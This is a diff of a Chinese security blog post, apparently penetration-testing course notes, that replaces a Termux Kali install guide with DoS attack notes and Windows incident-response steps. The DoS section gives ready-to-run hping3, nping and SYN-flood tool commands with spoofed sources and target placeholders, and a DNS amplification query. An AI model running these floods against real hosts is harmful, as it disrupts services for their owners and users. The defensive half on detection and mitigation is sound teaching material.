@@ -1,19 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="在你的手机上搭建一台随时可用的Kali！">
-<title>[教程向]基于Termux在安卓手机上安装Kali</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DOS补充 SYN洪水攻击（Syn Flood） 1 2 3 git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git cd Python-SYN-Flood-Attack-Tool python3 py3_synflood_cmd.py -t [目标ip] -p [端口号] -c 5 DNS放大攻击 典型的流量放大攻击，以小汇多，利用协议特定进行放大流量\n1 2 3 4 # 安装 sudo apt-get install dnsutils # 使用 dig ANY [域名] @[DNS地址，例如114.114.114.114] 使用后DNS服务器会返回信息（回包）给目标域名，导致端口受阻。\nhping3 定制发送任何的数据包\n参数解释：\n-a伪造数据包\n-q不返回\n-n不解析域名\n-s源端口\n-d字节数\n-p端口\n--flood以flood形式进行攻击\nsyn-flood 1 2 3 sudo hping3 -c 3000 -d 120 -S -w 64 -p [端口号] --flood --rand-source [目标ip] 或（简化版） sudo hping3 -S -P -p 80 --flood --rand-source [目标ip] tcp-flood 1 sudo hping3 -SARUFP -p [端口号] --flood --rand-source [目标ip] icmp-flood 1 sudo hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip] udp-flood 1 sudo hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip] LAND 一种特殊的syn-flood攻击，源地址和目的地址都是受害者，自己和自己完成三次握手\n">
+<title>1.15 DOS补充和Win应急响应</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/%E6%95%99%E7%A8%8B%E5%90%91%E5%9F%BA%E4%BA%8Etermux%E5%9C%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85kali/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/'>
 
-<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="[教程向]基于Termux在安卓手机上安装Kali">
-<meta property='og:description' content="在你的手机上搭建一台随时可用的Kali！">
-<meta property='og:url' content='https://www.retr0.xyz/p/%E6%95%99%E7%A8%8B%E5%90%91%E5%9F%BA%E4%BA%8Etermux%E5%9C%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85kali/'>
+<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="1.15 DOS补充和Win应急响应">
+<meta property='og:description' content="DOS补充 SYN洪水攻击（Syn Flood） 1 2 3 git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git cd Python-SYN-Flood-Attack-Tool python3 py3_synflood_cmd.py -t [目标ip] -p [端口号] -c 5 DNS放大攻击 典型的流量放大攻击，以小汇多，利用协议特定进行放大流量\n1 2 3 4 # 安装 sudo apt-get install dnsutils # 使用 dig ANY [域名] @[DNS地址，例如114.114.114.114] 使用后DNS服务器会返回信息（回包）给目标域名，导致端口受阻。\nhping3 定制发送任何的数据包\n参数解释：\n-a伪造数据包\n-q不返回\n-n不解析域名\n-s源端口\n-d字节数\n-p端口\n--flood以flood形式进行攻击\nsyn-flood 1 2 3 sudo hping3 -c 3000 -d 120 -S -w 64 -p [端口号] --flood --rand-source [目标ip] 或（简化版） sudo hping3 -S -P -p 80 --flood --rand-source [目标ip] tcp-flood 1 sudo hping3 -SARUFP -p [端口号] --flood --rand-source [目标ip] icmp-flood 1 sudo hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip] udp-flood 1 sudo hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip] LAND 一种特殊的syn-flood攻击，源地址和目的地址都是受害者，自己和自己完成三次握手\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-25T23:23:58&#43;08:00'/><meta property='article:modified_time' content='2025-11-25T23:23:58&#43;08:00'/><meta property='og:image' content='https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/termux.webp' />
-<meta name="twitter:title" content="[教程向]基于Termux在安卓手机上安装Kali">
-<meta name="twitter:description" content="在你的手机上搭建一台随时可用的Kali！"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/termux.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-18T22:46:46&#43;08:00'/><meta property='article:modified_time' content='2025-12-18T22:46:46&#43;08:00'/>
+<meta name="twitter:title" content="1.15 DOS补充和Win应急响应">
+<meta name="twitter:description" content="DOS补充 SYN洪水攻击（Syn Flood） 1 2 3 git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git cd Python-SYN-Flood-Attack-Tool python3 py3_synflood_cmd.py -t [目标ip] -p [端口号] -c 5 DNS放大攻击 典型的流量放大攻击，以小汇多，利用协议特定进行放大流量\n1 2 3 4 # 安装 sudo apt-get install dnsutils # 使用 dig ANY [域名] @[DNS地址，例如114.114.114.114] 使用后DNS服务器会返回信息（回包）给目标域名，导致端口受阻。\nhping3 定制发送任何的数据包\n参数解释：\n-a伪造数据包\n-q不返回\n-n不解析域名\n-s源端口\n-d字节数\n-p端口\n--flood以flood形式进行攻击\nsyn-flood 1 2 3 sudo hping3 -c 3000 -d 120 -S -w 64 -p [端口号] --flood --rand-source [目标ip] 或（简化版） sudo hping3 -S -P -p 80 --flood --rand-source [目标ip] tcp-flood 1 sudo hping3 -SARUFP -p [端口号] --flood --rand-source [目标ip] icmp-flood 1 sudo hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip] udp-flood 1 sudo hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip] LAND 一种特殊的syn-flood攻击，源地址和目的地址都是受害者，自己和自己完成三次握手\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -320,14 +319,62 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#获取termux">获取termux</a></li>
-    <li><a href="#安装kali">安装Kali</a></li>
-    <li><a href="#使用vnc连接可视化界面">使用VNC连接可视化界面</a></li>
-    <li><a href="#问题解决vnc服务停止输出process-completed-signal-9">问题解决：VNC服务停止，输出Process-completed-signal-9</a>
+    <li><a href="#dos补充">DOS补充</a>
       <ol>
-        <li><a href="#简述">简述</a></li>
-        <li><a href="#如果手机没有root权限">如果手机没有Root权限</a></li>
-        <li><a href="#如果手机有root权限">如果手机有Root权限</a></li>
+        <li><a href="#syn洪水攻击syn-flood">SYN洪水攻击（Syn Flood）</a></li>
+        <li><a href="#dns放大攻击">DNS放大攻击</a></li>
+        <li><a href="#hping3">hping3</a>
+          <ol>
+            <li><a href="#syn-flood">syn-flood</a></li>
+            <li><a href="#tcp-flood">tcp-flood</a></li>
+            <li><a href="#icmp-flood">icmp-flood</a></li>
+            <li><a href="#udp-flood">udp-flood</a></li>
+            <li><a href="#land">LAND</a></li>
+          </ol>
+        </li>
+        <li><a href="#tcp全链接dos攻击">TCP全链接DOS攻击</a></li>
+      </ol>
+    </li>
+    <li><a href="#应急响应">应急响应</a>
+      <ol>
+        <li><a href="#查看日志">查看日志</a>
+          <ol>
+            <li><a href="#使用日志查看器">使用日志查看器</a></li>
+            <li><a href="#windows日志位置">Windows日志位置：</a></li>
+          </ol>
+        </li>
+        <li><a href="#检查账户">检查账户</a>
+          <ol>
+            <li><a href="#图形化界面检查">图形化界面检查</a></li>
+            <li><a href="#通过注册表检查">通过注册表检查</a></li>
+          </ol>
+        </li>
+        <li><a href="#文件分析">文件分析</a>
+          <ol>
+            <li><a href="#检查临时目录">检查临时目录</a></li>
+            <li><a href="#检查访问记录">检查访问记录</a></li>
+            <li><a href="#检查文件修改时间">检查文件修改时间</a></li>
+            <li><a href="#检查hosts文件">检查hosts文件</a></li>
+          </ol>
+        </li>
+        <li><a href="#网络行为排查">网络行为排查</a></li>
+        <li><a href="#网络连接排查">网络连接排查</a></li>
+        <li><a href="#流量分析">流量分析</a></li>
+        <li><a href="#漏洞和补丁信息">漏洞和补丁信息</a></li>
+        <li><a href="#网络攻击的判断与防御">网络攻击的判断与防御</a>
+          <ol>
+            <li><a href="#ddos通用防御">DDOS通用防御</a></li>
+            <li><a href="#syn攻击判断">syn攻击判断</a></li>
+            <li><a href="#udp攻击判断">udp攻击判断</a></li>
+            <li><a href="#cc攻击">cc攻击</a></li>
+            <li><a href="#dns放大攻击-1">DNS放大攻击</a></li>
+            <li><a href="#arp欺骗判断">ARP欺骗判断</a></li>
+          </ol>
+        </li>
+        <li><a href="#可疑进程分析">可疑进程分析</a></li>
+        <li><a href="#启动项排查">启动项排查</a></li>
+        <li><a href="#计划任务排查">计划任务排查</a></li>
+        <li><a href="#特定事件痕迹">特定事件痕迹</a></li>
       </ol>
     </li>
   </ol>
@@ -341,23 +388,19 @@
 
 
             <main class="main full-width">
-    <article class="has-image main-article">
+    <article class="main-article">
     <header class="article-header">
-        <div class="article-image">
-            <a href="/p/%E6%95%99%E7%A8%8B%E5%90%91%E5%9F%BA%E4%BA%8Etermux%E5%9C%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85kali/">
-                
-                    <img src="/post/kali%e4%bb%8e%e5%85%a5%e9%97%a8%e5%88%b0%e5%85%a5%e7%8b%b1/termux.webp" loading="lazy" alt="Featured image of post [教程向]基于Termux在安卓手机上安装Kali" />
-                
-            </a>
-        </div>
-    
 
     <div class="article-details">
     
     <header class="article-category">
         
-            <a href="/categories/kali/" style="background-color: #018AE1; color: #fff;">
-                Kali
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/" >
+                渗透测试微专业
             </a>
         
     </header>
@@ -365,13 +408,9 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E6%95%99%E7%A8%8B%E5%90%91%E5%9F%BA%E4%BA%8Etermux%E5%9C%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85kali/">[教程向]基于Termux在安卓手机上安装Kali</a>
+            <a href="/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">1.15 DOS补充和Win应急响应</a>
         </h2>
     
-        
-        <h3 class="article-subtitle">
-            在你的手机上搭建一台随时可用的Kali！
-        </h3>
         
     </div>
 
@@ -391,7 +430,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-11-25</time>
+                <time class="article-time--published">2025-12-18</time>
             </div>
         
 
@@ -414,268 +453,214 @@
     <section class="article-content">
     
     
-    <h2 id="获取termux">获取termux
-</h2><p>由<a class="link" href="https://termux.dev/cn/"  target="_blank" rel="noopener"
-    >Termux</a>官网指引，我们可以从官方Github软件仓库下载最新版本，链接如下：</p>
-<p><a class="link" href="https://github.com/termux/termux-app#github"  target="_blank" rel="noopener"
-    >GitHub - termux/termux-app: Termux - a terminal emulator application for Android OS extendible by variety of packages.</a></p>
-<p>安装相应版本即可</p>
-<h2 id="安装kali">安装Kali
-</h2><ol>
-<li>打开termux（打开之后不要切换目录，在当前目录下执行以下命令）</li>
+    <h2 id="dos补充">DOS补充
+</h2><h3 id="syn洪水攻击syn-flood">SYN洪水攻击（Syn Flood）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Python-SYN-Flood-Attack-Tool
+</span></span><span class="line"><span class="cl">python3 py3_synflood_cmd.py -t <span class="o">[</span>目标ip<span class="o">]</span> -p <span class="o">[</span>端口号<span class="o">]</span> -c <span class="m">5</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="dns放大攻击">DNS放大攻击
+</h3><p>典型的流量放大攻击，以小汇多，利用协议特定进行放大流量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 安装</span>
+</span></span><span class="line"><span class="cl">sudo apt-get install dnsutils
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用</span>
+</span></span><span class="line"><span class="cl">dig ANY <span class="o">[</span>域名<span class="o">]</span> @<span class="o">[</span>DNS地址，例如114.114.114.114<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用后DNS服务器会返回信息（回包）给目标域名，导致端口受阻。</p>
+<h3 id="hping3">hping3
+</h3><blockquote>
+<p>定制发送任何的数据包</p>
+</blockquote>
+<p><strong>参数解释：</strong></p>
+<p><code>-a</code>伪造数据包</p>
+<p><code>-q</code>不返回</p>
+<p><code>-n</code>不解析域名</p>
+<p><code>-s</code>源端口</p>
+<p><code>-d</code>字节数</p>
+<p><code>-p</code>端口</p>
+<p><code>--flood</code>以flood形式进行攻击</p>
+<h4 id="syn-flood">syn-flood
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hping3 -c <span class="m">3000</span> -d <span class="m">120</span> -S -w <span class="m">64</span> -p <span class="o">[</span>端口号<span class="o">]</span> --flood --rand-source <span class="o">[</span>目标ip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">或（简化版）
+</span></span><span class="line"><span class="cl">sudo hping3 -S -P -p <span class="m">80</span> --flood --rand-source <span class="o">[</span>目标ip<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="tcp-flood">tcp-flood
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hping3 -SARUFP -p <span class="o">[</span>端口号<span class="o">]</span> --flood --rand-source <span class="o">[</span>目标ip<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="icmp-flood">icmp-flood
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hping3 -q -n -a 1.1.1.1 --icmp -d <span class="m">56</span> --flood <span class="o">[</span>目标ip<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="udp-flood">udp-flood
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hping3 -a 1.1.1.1 --udp -s <span class="m">53</span> -d <span class="m">100</span> -p <span class="m">53</span> --flood <span class="o">[</span>目标ip<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="land">LAND
+</h4><blockquote>
+<p>一种特殊的syn-flood攻击，源地址和目的地址都是受害者，自己和自己完成三次握手</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hping3 -n -a <span class="o">[</span>目标ip<span class="o">]</span> -S -d <span class="m">100</span> -p <span class="m">80</span> --flood <span class="o">[</span>目标ip<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="tcp全链接dos攻击">TCP全链接DOS攻击
+</h3><p><strong>注：</strong> 命令中的数据任意，够大就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nping --tcp-connect --rate<span class="o">=</span><span class="m">10000</span> -c <span class="m">10000000000</span> -q <span class="o">[</span>目标ip<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="应急响应">应急响应
+</h2><blockquote>
+<p>如果我被黑客入侵了会发生什么？</p>
+</blockquote>
+<ul>
+<li><strong>web入侵：</strong> 挂马、网页篡改、植入webshell、黑页、暗链等</li>
+<li><strong>主机入侵：</strong> 病毒木马、勒索病毒、远控后门、系统异常、RDP爆破、SSH爆破、主机漏洞、数据库入侵等</li>
+<li><strong>网络攻击：</strong> DDOS/CC攻击、ARP攻击、DNS/HTTP劫持</li>
+<li><strong>路由器交换机攻击：</strong> 内网病毒、配置错误、机器本身漏洞</li>
+</ul>
+<h3 id="查看日志">查看日志
+</h3><h4 id="使用日志查看器">使用日志查看器
+</h4><p><strong>方法一：</strong> 使用<code>Win+R</code>并输入mmc打开控制台根节点，在工具栏中选择 <strong>文件&ndash;添加/删除管理单元&ndash;事件查看器</strong> 并添加</p>
+<p><strong>方法二：</strong> 右键桌面上的“此电脑”，点击“管理”，选择事件查看器即可。</p>
+<p><strong>方法三：</strong> 使用<code>Win+R</code>并输入<code>eventvwr.msc</code>回车即可</p>
+<h4 id="windows日志位置">Windows日志位置：
+</h4><p>Windows 2000/2003/xp：<code>\%Systemroot%\System32\Config\*.evt</code></p>
+<p>Windows vista/7/8及以后：<code>\%Systemroot%\System32\winevt\Logs\*evtx</code></p>
+<h3 id="检查账户">检查账户
+</h3><h4 id="图形化界面检查">图形化界面检查
+</h4><p>可以在刚才的mmc中 <strong>添加本地用户和组</strong> ，也可以在“此电脑”的 <strong>管理</strong> 中打开</p>
+<p>检查Guest账户是否开启、是否存在隐藏账户等</p>
+<h4 id="通过注册表检查">通过注册表检查
+</h4><p>转到<code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\</code>下，检查其中名字较长的几个文件夹是否有可以账户存在</p>
+<h3 id="文件分析">文件分析
+</h3><h4 id="检查临时目录">检查临时目录
+</h4><p>转到<code>C:\Users\Administrator\Local Settings\Temp</code>（必须直接敲完整路径，不然找不到）</p>
+<p>检查桌面文件夹<code>C:\Users\Administrator\Desktop</code></p>
+<h4 id="检查访问记录">检查访问记录
+</h4><p>转到<code>C:\Users\Administrator\Recent</code>（必须直接敲完整路径，不然找不到）</p>
+<p>这是最近访问的文件</p>
+<h4 id="检查文件修改时间">检查文件修改时间
+</h4><h4 id="检查hosts文件">检查hosts文件
+</h4><h3 id="网络行为排查">网络行为排查
+</h3><p>使用网络沙箱：</p>
+<p><a class="link" href="https://www.virustotal.com/gui/home/upload"  target="_blank" rel="noopener"
+    >TotalVirus</a></p>
+<p><a class="link" href="https://s.threatbook.com/"  target="_blank" rel="noopener"
+    >微步云沙箱</a></p>
+<p>检查备案情况：</p>
+<p><a class="link" href="https://beian.miit.gov.cn/"  target="_blank" rel="noopener"
+    >ICP/IP地址/域名信息备案管理系统</a></p>
+<p>直接Google</p>
+<h3 id="网络连接排查">网络连接排查
+</h3><p>cmd执行：</p>
+<p><code>netstat -ano</code>	查看可疑连接和进程</p>
+<p><code>tasklist</code>		找到可疑进程</p>
+<h3 id="流量分析">流量分析
+</h3><p>使用WireShark、Charles</p>
+<h3 id="漏洞和补丁信息">漏洞和补丁信息
+</h3><p>命令<code>systeminfo</code></p>
+<p>打开Windows自动更新</p>
+<h3 id="网络攻击的判断与防御">网络攻击的判断与防御
+</h3><h4 id="ddos通用防御">DDOS通用防御
+</h4><p>限制单ip请求、负载均衡、cdn、禁止icm、隐藏真实ip、流量清洗、优化tcp/ip栈、代码合理使用缓存、cdn云清洗</p>
+<h4 id="syn攻击判断">syn攻击判断
+</h4><p>服务器cpu占用率高，大量SYN_RECEIVED网络连接状态，网络恢复后负载瞬间变高，断开后负载下降】</p>
+<p><strong>防御：</strong> 提高半开放连接队列的大小</p>
+<h4 id="udp攻击判断">udp攻击判断
+</h4><p>服务器cpu占用率高，每秒大量数据包，tcp正常</p>
+<h4 id="cc攻击">cc攻击
+</h4><p>服务器cpu占用率高，web服务器出现service unavailable提示，大量establish网络连接，单ip高达上百，用户无法正常访问</p>
+<h4 id="dns放大攻击-1">DNS放大攻击
+</h4><p>大量的dns请求</p>
+<p><strong>防御：</strong> ips规则，关闭递归查询，DNS解析器只接受受信任的域名服务，acl</p>
+<h4 id="arp欺骗判断">ARP欺骗判断
+</h4><p>cmd执行<code>arp -a</code>查看mac地址是否重复，特别是网关</p>
+<p><strong>防御：</strong> 防火墙，mac地址绑定</p>
+<h3 id="可疑进程分析">可疑进程分析
+</h3><ol>
+<li><code>tasklist</code>查看进程</li>
 </ol>
-<p><img src="https://free.picui.cn/free/2025/11/26/69263d72565f8.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
+<ul>
+<li>名称随机，后缀也不是exe的是可疑进程</li>
+<li>任务管理器中svchost.exe运行的权限太过普通（例如你的用户名）</li>
+</ul>
 <ol start="2">
-<li><code>pkg update</code> 更新依赖，类似于更新以安装的软件(依赖更新检查完成之后会有一个让你确认是否继续更新的操作，我们输入y就可以了）</li>
+<li><code>tasklist | findstr 进程名称</code></li>
+<li>可以使用 <strong>pchunter</strong> 软件查看</li>
+<li><code>wmic process | find &quot;进程id&quot; &gt; proc.csv</code></li>
+<li><code>tasklist /svc</code></li>
 </ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">pkg update
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://free.picui.cn/free/2025/11/26/69263d7297445.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<ol start="3">
-<li><code>pkg upgrade</code>升极版本，这个相比较上个命令，更新的是系统版本</li>
+<h3 id="启动项排查">启动项排查
+</h3><ol>
+<li>排查以下几个位置：</li>
 </ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">pkg upgrade
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://free.picui.cn/free/2025/11/26/69263d7298f29.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<ol start="4">
-<li>申请存储访问权限 <code>termux-setup-storage</code>（这个命令可以是我们能使用termux向手机写入数据）</li>
+<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code></p>
+<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></p>
+<p>其他见<a class="link" href="https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/"  target="_blank" rel="noopener"
+    >1.14 自启动和DOS攻击初步</a>的2.2部分</p>
+<ol start="2">
+<li><code>Win+R</code>输入<code>msconfig</code>在 <strong>启动</strong> 选项卡中查看启动项（高版本Windows可能移动到任务管理器中）</li>
+<li>排查<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
+<li>排查是否有可疑的服务</li>
 </ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">termux-setup-storage
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://free.picui.cn/free/2025/11/26/69263d725b764.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<ol start="5">
-<li>安装 <code>pkg install wget</code>（用来下载文件的命令）</li>
+<h3 id="计划任务排查">计划任务排查
+</h3><p>排查<code>C:\Windows\System32\Tasks</code>和<code>C:\Windows\Tasks</code></p>
+<p>也可以在mmc或者此电脑的管理中查看计划任务</p>
+<h3 id="特定事件痕迹">特定事件痕迹
+</h3><ol>
+<li>挖矿程序</li>
+<li>勒索病毒</li>
 </ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">pkg install wget (因为我已经安装过了，所以显示的是这个)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://free.picui.cn/free/2025/11/26/69263d72740d0.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<ol start="6">
-<li>下载 安装脚本<code>wget -O install-nethunter-termux https://offs.ec/2MceZWr</code> （这个是用来安装kaili的脚本，这个是重点，因为系统的镜像是在这里下载的，我们需要耐心的等待下载完成）</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">wget -O install-nethunter-termux https://offs.ec/2MceZWr
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://free.picui.cn/free/2025/11/26/69263d8494ed8.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>然后就得到了这样一个文件</p>
-<p><img src="https://free.picui.cn/free/2025/11/26/69263d8457681.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<ol start="7">
-<li>给脚本执行权限<code>chmod +x install-nethunter-termux</code> （这样我们可以执行这个脚本&rsquo;x&rsquo;是执行权限）</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">chmod +x install-nethunter-termux
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://free.picui.cn/free/2025/11/26/69263d845a6ad.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<ol start="8">
-<li>运行安装脚本 <code>./install-nethunter-termux</code></li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">./install-nethunter-termux
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://free.picui.cn/free/2025/11/26/69263d8461b55.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<ol start="9">
-<li>
-<p>然后会出现一个kali的banner，等待下载完成（要有耐心，和一个流畅的网络，中途可能会下载失败，我们只需要重新开始就行了 因为wget 加上了O选项，所以会继续上次的下载位置，若是下载完成，但是不能安装系统，多半是系统安装包被命名其他的名字或者是下载的确是失败了）</p>
-</li>
-<li>
-<p>下载完成之后，执行 <code>./install-nethunter-termux</code>,等待一阵之后，安装完成。</p>
-</li>
-</ol>
-<p><code>nethunter</code>（或者缩写<code>nh</code>） 开启 kalilinux命令行，注意开启的是普通权限的命令行</p>
-<p><code>nethunter -r</code> 开启的是管理员的命令行</p>
